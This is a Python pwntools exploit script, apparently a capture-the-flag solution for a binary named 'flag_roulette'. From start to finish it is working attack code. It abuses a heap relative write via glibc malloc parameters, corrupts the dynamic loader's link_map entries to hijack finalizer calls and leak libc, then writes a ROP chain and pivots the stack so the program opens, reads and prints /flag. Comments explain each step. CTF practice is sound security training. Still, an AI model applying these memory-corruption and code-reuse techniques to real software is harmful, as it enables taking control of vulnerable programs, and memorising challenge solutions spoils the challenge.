from pwn import *

elf = ELF("../dist/flag_roulette")
libc = ELF("../dist/libc.so.6")
ld = ELF("../dist/ld-linux-x86-64.so.2")

context.binary = "../dist/flag_roulette"

#p = process("./flag_roulette")
p = remote(b"0.0.0.0", 1337)


l_info = {
  "DT_NULL" : 8 * 8,
  "DT_NEEDED" : 9 * 8,
  "DT_PLTRELSZ" : 10 * 8,
  "DT_PLTGOT" : 11 * 8,
  "DT_HASH" : 12 * 8,
  "DT_STRTAB" : 13 * 8,
  "DT_SYMTAB" : 14 * 8,
  "DT_RELA" : 15 * 8,
  "DT_RELASZ" : 16 * 8,
  "DT_RELAENT" : 17 * 8,
  "DT_STRSZ" : 18 * 8,
  "DT_SYMENT" : 19 * 8,
  "DT_INIT" : 20 * 8,
  "DT_FINI" : 21 * 8,
  "DT_SONAME" : 22 * 8,
  "DT_RPATH" : 23 * 8,
  "DT_SYMBOLIC" : 24 * 8,
  "DT_REL" : 25 * 8,
  "DT_RELSZ" : 26 * 8,
  "DT_RELENT" : 27 * 8,
  "DT_PLTREL" : 28 * 8,
  "DT_DEBUG" : 29 * 8,
  "DT_TEXTREL" : 30 * 8,
  "DT_JMPREL" : 31 * 8,
  "DT_BIND_NOW" : 32 * 8,
  "DT_INIT_ARRAY" : 33 * 8,
  "DT_FINI_ARRAY" : 34 * 8,
  "DT_INIT_ARRAYSZ" : 35 * 8,
  "DT_FINI_ARRAYSZ" : 36 * 8,
  "DT_RUNPATH" : 37 * 8,
  "DT_FLAGS" : 38 * 8,
  "DT_ENCODING" : 39 * 8,
  "DT_PREINIT_ARRAY" : 40 * 8,
  "DT_PREINIT_ARRAYSZ" : 41 * 8,
  "DT_SYMTAB_SHNDX" : 42 * 8,
  "DT_RELRSZ" : 43 * 8,
  "DT_RELR" : 44 * 8,
  "DT_RELRENT" : 45 * 8,
  "DT_NUM" : 46 * 8
}

link_map_offsets = {"l_addr": 0 * 8,
                    "l_name": 1 * 8,
                    "l_ld": 2 * 8,
                    "l_next": 3 * 8,
                    "l_prev": 4 * 8,
                    "l_real": 5 * 8,
                    "l_ns": 6 * 8,
                    "l_libname": 7 * 8,
                    "l_info": l_info}

def enable_relative_write():
    """
    The mmap_threshold will increment by 0x1000 each time we mmap a chunk. In our case it means we can mmap at most 2 chunks.
    But we need more, like way more. To achieve our goals, we will have to prevent mmap_threshold from incrementing.
    Luckily, another variable in the mp_ struct allows us to do just that : no_dyn_threshold
    The variable no_dyn_threshold is basically a boolean meant to allow the programmer to manually set mmap_threshold 
    And in our case, it enhance our relative write from 2 bytes to an arbitrary number of bytes \o/
    """
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(b"134512") # 0x20d70
    p.recvuntil(b">")
    p.sendline(b"2061208") # offset of mp_.no_dyn_threshold
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(b"2")

def relative_write(byte, offset):
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(b"135168") # 0x21000
    p.recvuntil(b">")
    p.sendline(str(offset).encode())
    p.recvuntil(b">")
    p.sendline(str(byte).encode())
    p.recvuntil(b">")
    p.sendline(b"2")

enable_relative_write()


def heap_feng_shui():

  for i in range(16):
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(b"128")
    p.recvuntil(b">")
    p.sendline(str(128+i).encode())
    p.recvuntil(b">")
    p.sendline(b"32")
    p.recvuntil(b">")
    p.sendline(b"2")

def heap_cleaning():

  for i in range(8):
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(b"200")
    p.recvuntil(b">")
    p.sendline(str(2592+i).encode())
    p.recvuntil(b">")
    p.sendline(b"0")
    p.recvuntil(b">")
    p.sendline(b"2")

    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(b"200")
    p.recvuntil(b">")
    p.sendline(str(2592+8).encode())
    p.recvuntil(b">")
    p.sendline(b"113") # 0x71
    p.recvuntil(b">")
    p.sendline(b"2")

  for i in range(7):
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(b"200")
    p.recvuntil(b">")
    p.sendline(str(2592+9+i).encode())
    p.recvuntil(b">")
    p.sendline(b"0")
    p.recvuntil(b">")
    p.sendline(b"2")
  


# To be able to leak libc, we need to make sure the program does not exit when calling the exit() function
# We will achieve this by attacking the link_map of the binary itself
# It is stored at ld + 0x332d0

ld = 0x22b000 - 0x10
link_map = ld + 0x332d0

# First, we should have to disable link_map->l_info[DT_FINI_ARRAY]
# l_info is at offset 8 of the link_map and DT_ARRAY is at offset 26 of l_info https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L907


for i in range(8):
  relative_write(0, link_map + link_map_offsets["l_info"]["DT_FINI_ARRAY"] + i)

# Now, we cannot do a partial write on link_map->l_info[DT_FINI] to point it where a space of memory we control, as we cannot write near the memory space of the binary
# However, as the offset used in DL_CALL_DT_FINI is fixed, we could overwrite link_map->l_addr to trick the binary into cycling back to main
# The problem is, we will have to write the 2 lower bytes in link_map->l_addr, meaning we must guess 4 random bits
# This is acceptable

relative_write(0x86, link_map + link_map_offsets["l_addr"])
relative_write(0x2c, link_map + link_map_offsets["l_addr"] + 1)


# Well, this is done
# Time for some heap feng shui
heap_feng_shui()


# Trying to loop back to main
print("[*] There is 93.75% chance that the exploit will crash on this step")
print("[*] Will we get lucky ?")

p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b">")
p.sendline(b"128")
p.recvuntil(b">")
p.sendline(b"0")
p.recvuntil(b">")
p.sendline(b"66")
p.recvuntil(b">")
p.sendline(b"3")

leak = u64(p.recvline().split(b" ")[-1].strip().ljust(8, b"\x00"))
libc.address = leak - 0x1d3ce0

print("[+] Libc base address :", hex(libc.address))

# Before doing anything else, we need to clean the mess we made earlier in the heap
heap_cleaning()
print("[+] Heap cleaned successfully")


# Reparing the initial struct
relative_write(1, 0x1fa2f8)
relative_write(4, 0x1fa300)

# We will write our ropchain at the offset -0x3000 from the libc base
# We have quite a lot of free space here so we do not need to worry about overwriting anything with our ropchain
ropchain_addr = libc.address - 0x3000

###################
### Rop gadgets ###
###################

add_rsp_0x18 = libc.address + 0x0000000000035cf5
syscall = libc.address + 0x00000000000853b2


# Writing the filename of the flag in memory
filename_addr = libc.address - 0x2a00
filename_offset = 0x225f0
filename = b"/flag"
for i in range(len(filename)):
  relative_write(filename[i], filename_offset + i)

# Writing our ropchain in memory
rop = ROP(libc)
rop(rax=2, rdi=filename_addr, rsi=0, rdx=0)
rop.raw(syscall)
rop(rax=0, rdi=3, rsi=filename_addr, rdx=0x100)
rop.raw(syscall)
rop(rax=1, rdi=1, rsi=filename_addr, rdx=100)
rop.raw(syscall)
rop(rax=60, rdi=0)
rop.raw(syscall)

ropchain = rop.chain()
ropchain_offset = 0x22008


for i in range(len(ropchain)):
  relative_write(ropchain[i], ropchain_offset + i)



# Now for the fun part
# We need to pivot the stack so that rsp points to the start of our ropchain
# We have the following gadget in libc : 
#    0x000000000003c338: mov rsp, r8; mov rbp, r9; jmp rdx;
stack_pivot_gadget = libc.address + 0x000000000003c338

# But how exactly do we control the value of r8 ?
# We have another gadget in libc just for that : 
#     mov r8, rdx; mov qword ptr [rdi], r8; mov qword ptr [rdi + 8], rcx; xor eax, eax; ret;
mov_r8_rdx = libc.address + 0x000000000004118b

# Now let's chain them by corrupting the link_maps once again :p


# Let's start once again by the link_map of the binary itself
ld = 0x22b000 - 0x10
link_map = ld + 0x332d0

# Put the address of our ropchain in rdx
for i in range(len(p64(ropchain_addr))):
  relative_write(p64(ropchain_addr)[i], link_map + link_map_offsets["l_info"]["DT_FINI"] + i)

# Put the address of our mov_r8_rdx gadget in rax
for i in range(len(p64(mov_r8_rdx))):
  relative_write(p64(mov_r8_rdx)[i], link_map + link_map_offsets["l_addr"] + i)


# Now, we will corrupt the next link-map : the link-map of the libseccomp
libseccomp = 0x207000 - 0x10
link_map = libseccomp + 0x221e0

# Disable DT_FINI_ARRAY
for i in range(8):
  relative_write(0, link_map + link_map_offsets["l_info"]["DT_FINI_ARRAY"] + i)

# Put the address of a add_rsp gadget into rdx
# The added value itself is not very important (as long as it allows us to add at least 0x10)
# Put we must know the value of the QWORD behind, because _dl_call_fini will add it added to rax before jumping
for i in range(len(p64(add_rsp_0x18))):
  relative_write(p64(add_rsp_0x18)[i], link_map + link_map_offsets["l_info"]["DT_FINI"] + i)

# Put the address of our stack_pivot_gadget in rax minus the value at [rdx+8] that will be added
to_set = p64((stack_pivot_gadget - 0x0824748d48000044) & 0xffffffffffffffff)
for i in range(len(to_set)):
  relative_write(to_set[i], link_map + link_map_offsets["l_addr"] + i)


# Let the magic works !
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b">")
p.sendline(b"128")
p.recvuntil(b">")
p.sendline(b"0")
p.recvuntil(b">")
p.sendline(b"66")
p.recvuntil(b">")
p.sendline(b"3")


p.recvline()
p.recvline()
flag = p.recvline().decode()

print("Enjoy your flag :", flag)
